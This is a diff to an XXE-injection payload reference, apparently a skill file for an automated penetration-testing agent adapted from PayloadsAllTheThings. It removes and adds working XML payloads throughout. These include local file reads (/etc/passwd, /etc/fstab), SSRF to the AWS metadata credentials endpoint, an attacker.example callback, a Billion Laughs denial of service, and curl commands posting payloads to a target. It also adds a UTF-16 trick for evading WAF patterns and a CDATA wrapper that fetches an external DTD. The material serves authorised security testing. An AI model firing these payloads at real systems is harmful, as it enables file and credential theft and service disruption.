@@ -1,5 +1,5 @@
 ---
-description: File read, OOB/blind XXE, DoS, context-specific (SOAP, SVG, DOCX)
+description: php://filter read, external-DTD and error-based exfiltration, XInclude/UTF-16/CDATA bypasses, carriers (SOAP, SVG, DOCX)
 skill: xxe-testing
 source: PayloadsAllTheThings — XXE Injection
 source_revision: 3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a
@@ -12,28 +12,6 @@ source_license: MIT; see THIRD_PARTY_NOTICES.md
 
 ## Classic XXE — File Read
 
-### Linux
-
-```xml
-<?xml version="1.0" encoding="ISO-8859-1"?>
-<!DOCTYPE foo [
-  <!ELEMENT foo ANY>
-  <!ENTITY xxe SYSTEM "file:///etc/passwd">
-]>
-<foo>&xxe;</foo>
-```
-
-### Windows
-
-```xml
-<?xml version="1.0" encoding="ISO-8859-1"?>
-<!DOCTYPE foo [
-  <!ELEMENT foo ANY>
-  <!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">
-]>
-<foo>&xxe;</foo>
-```
-
 ### PHP Source Code (Base64)
 
 ```xml
@@ -45,39 +23,14 @@ source_license: MIT; see THIRD_PARTY_NOTICES.md
 <foo>&xxe;</foo>
 ```
 
-## SSRF via XXE
-
-```xml
-<?xml version="1.0" encoding="ISO-8859-1"?>
-<!DOCTYPE foo [
-  <!ELEMENT foo ANY>
-  <!ENTITY xxe SYSTEM "http://internal.service/secret_pass.txt">
-]>
-<foo>&xxe;</foo>
-```
-
-```xml
-<!-- AWS metadata -->
-<!DOCTYPE foo [
-  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">
-]>
-<foo>&xxe;</foo>
-```
-
 ## Blind XXE — Out-of-Band (OOB)
 
-### Detection via HTTP Callback
-
-```xml
-<?xml version="1.0"?>
-<!DOCTYPE root [
-  <!ENTITY % ext SYSTEM "http://attacker.example/xxe-canary">
-  %ext;
-]>
-<root></root>
-```
-
 ### Data Exfiltration via External DTD
+
+`attacker.example` here is a host that **serves** `ext.dtd`. Vigil's interactsh server only
+records requests, so this needs an operator-provisioned listener (`$DIR/.listener_url`,
+`agent/shared-constraints.md` §12); exfiltrate into the minted `$OOB_HOST` as a subdomain label.
+Without a listener, use the local-DTD override under "Error-Based XXE", which needs no hosting.
 
 **Malicious XML:**
 
@@ -117,37 +70,45 @@ Using local DTD file override (Linux — `/usr/share/xml/fontconfig/fonts.dtd`):
 <message>text</message>
 ```
 
-## XXE Denial of Service (Billion Laughs)
+## XInclude and Encoding Bypasses
+
+**XInclude** is the vector when you control one value inside a document but not the DOCTYPE (the
+server builds the XML around your input, e.g. a SOAP field):
 
 ```xml
-<?xml version="1.0"?>
+<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>
+```
+
+**UTF-16** re-encoding evades WAF patterns that match ASCII `<!ENTITY`/`SYSTEM`; the parser decodes
+it normally:
+
+```bash
+printf '%s' '<?xml version="1.0" encoding="UTF-16"?><!DOCTYPE x [<!ENTITY e SYSTEM "file:///etc/hostname">]><x>&e;</x>' \
+  | iconv -f UTF-8 -t UTF-16 > "$DIR/scans/xxe_utf16.xml"   # host side; the runtime sees it as
+# /engagements/$ENGAGEMENT_KEY/scans/xxe_utf16.xml for curl --data-binary @<path>
+```
+
+**CDATA wrapper** for files containing `<` or `&` that break the document when inlined: the
+parameter entities must be joined in an external DTD, so it needs a hosted DTD (the
+operator-provisioned listener, `agent/shared-constraints.md` §12; interactsh serves nothing):
+
+```xml
 <!DOCTYPE data [
-  <!ENTITY a0 "dos">
-  <!ENTITY a1 "&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;">
-  <!ENTITY a2 "&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;">
-  <!ENTITY a3 "&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;">
-  <!ENTITY a4 "&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;">
+  <!ENTITY % start "<![CDATA[">
+  <!ENTITY % file SYSTEM "file:///etc/fstab">
+  <!ENTITY % end "]]>">
+  <!ENTITY % dtd SYSTEM "http://<listener>/wrapper.dtd">
+  %dtd;
 ]>
-<data>&a4;</data>
+<data>&all;</data>
+<!-- wrapper.dtd:  <!ENTITY all "%start;%file;%end;"> -->
 ```
 
 ## XXE in Different Contexts
 
 ### SOAP
 
-Place the DOCTYPE at the document root, before the SOAP envelope:
-
-```xml
-<?xml version="1.0"?>
-<!DOCTYPE foo [
-  <!ENTITY xxe SYSTEM "file:///etc/passwd">
-]>
-<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
-  <soap:Body>
-    <foo>&xxe;</foo>
-  </soap:Body>
-</soap:Envelope>
-```
+Place the DOCTYPE at the document root, before the SOAP envelope.
 
 ### SVG Image Upload
 
@@ -160,8 +121,6 @@ Place the DOCTYPE at the document root, before the SOAP envelope:
 ```
 
 ### DOCX / XLSX (Office Documents)
-
-Unzip the document, inject XXE into `word/document.xml` or `xl/workbook.xml`:
 
 Inject into the inner XML (e.g., `word/document.xml` or `xl/sharedStrings.xml`):
 
@@ -183,23 +142,3 @@ Inject into the inner XML (e.g., `word/document.xml` or `xl/sharedStrings.xml`):
 ```
 
 Re-zip and upload.
-
-### Content-Type Switching
-
-Change `Content-Type: application/json` to `Content-Type: application/xml` and send:
-
-```xml
-<?xml version="1.0"?>
-<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
-<root><name>&xxe;</name></root>
-```
-
-## Useful curl Examples
-
-```bash
-# Basic XXE test
-curl -X POST -H "Content-Type: application/xml" -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>' http://target/api
-
-# Blind XXE detection
-curl -X POST -H "Content-Type: application/xml" -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % ext SYSTEM "http://attacker.example/canary">%ext;]><foo>test</foo>' http://target/api
-```
